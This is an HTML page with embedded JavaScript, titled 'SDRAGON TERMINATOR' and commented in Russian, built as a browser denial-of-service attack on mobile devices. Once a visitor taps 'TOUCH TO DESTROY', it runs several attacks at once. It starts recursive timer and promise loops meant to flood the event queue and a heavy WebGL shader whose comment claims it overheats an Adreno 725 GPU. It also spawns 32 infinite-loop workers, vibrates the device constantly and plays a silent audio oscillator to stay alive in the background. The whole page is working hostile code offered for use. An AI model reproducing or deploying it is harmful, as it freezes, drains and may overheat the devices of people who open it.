<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SDRAGON TERMINATOR</title>
    <style>
        body { margin: 0; background: #000; overflow: hidden; }
        canvas { width: 100%; height: 100%; position: fixed; }
        #trigger { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            z-index: 999; display: flex; align-items: center; justify-content: center;
            background: rgba(0,0,0,0.8); color: white; font: bold 24px sans-serif;
        }
    </style>
</head>
<body>
    <div id="trigger">TOUCH TO DESTROY</div>
    <canvas id="c"></canvas>

    <script>
        const canvas = document.getElementById('c');
        const gl = canvas.getContext('webgl');

        function singularity() {
            // 1. МГНОВЕННЫЙ ЦИКЛ ПЕРЕПОЛНЕНИЯ (1мс дедлайн)
            const startTime = performance.now();
            
            // Нагрузка на шину памяти и кэш
            let i = 0;
            while (performance.now() - startTime < 1) { 
                // Создаем тяжелые объекты в микро-цикле
                let chunk = new Float64Array(1024 * 10);
                window.crypto.getRandomValues(chunk); // Напрягаем аппаратный генератор чисел
                i++;
            }

            // 2. РЕКУРСИВНЫЙ ПЕРЕЗАПУСК (Мгновенно)
            // Использование multiple сетов гарантирует, что очередь событий забьется быстрее, чем очистится
            setTimeout(singularity, 0);
            setTimeout(singularity, 0); 
            Promise.resolve().then(singularity);
        }

        function startGPU() {
            const vs = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vs, 'attribute vec2 p; void main(){gl_Position=vec4(p,0,1);}');
            gl.compileShader(vs);

            const fs = gl.createShader(gl.FRAGMENT_SHADER);
            // 1024 итерации — это гарантированный перегрев Adreno 725
            gl.shaderSource(fs, `
                precision highp float;
                uniform float t;
                void main(){
                    vec2 uv = gl_FragCoord.xy / 256.0;
                    vec3 c = vec4(0).rgb;
                    for(int i=0; i<1024; i++){ 
                        uv = abs(uv) / dot(uv,uv) - 1.1;
                        c += 0.0005 / length(uv);
                    }
                    gl_FragColor = vec4(c, 1.0);
                }
            `);
            gl.compileShader(fs);

            const p = gl.createProgram();
            gl.attachShader(p, vs); gl.attachShader(p, fs);
            gl.linkProgram(p); gl.useProgram(p);

            const b = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, b);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
            const a = gl.getAttribLocation(p, 'p');
            gl.enableVertexAttribArray(a);
            gl.vertexAttribPointer(a, 2, gl.FLOAT, false, 0, 0);

            function render() {
                gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                // Принудительная синхронизация GPU и CPU (самый мощный лаг)
                gl.finish(); 
                requestAnimationFrame(render);
            }
            render();
        }

        document.getElementById('trigger').onclick = function() {
            this.style.display = 'none';
            
            // Запуск "Белого шума" для удержания фона
            const ac = new AudioContext();
            const osc = ac.createOscillator();
            const g = ac.createGain();
            g.gain.value = 0.0001;
            osc.connect(g); g.connect(ac.destination);
            osc.start();

            // Вибрация "Землетрясение"
            setInterval(() => navigator.vibrate([500, 100, 500, 100]), 600);

            // Активация сингулярности
            singularity();
            startGPU();
            
            // CPU Workers (Максимальное число потоков)
            for(let i=0; i<32; i++) {
                const blob = new Blob(['while(1){Math.exp(Math.random())}'], {type:'text/javascript'});
                new Worker(URL.createObjectURL(blob));
            }
        };
    </script>
</body>
</html>

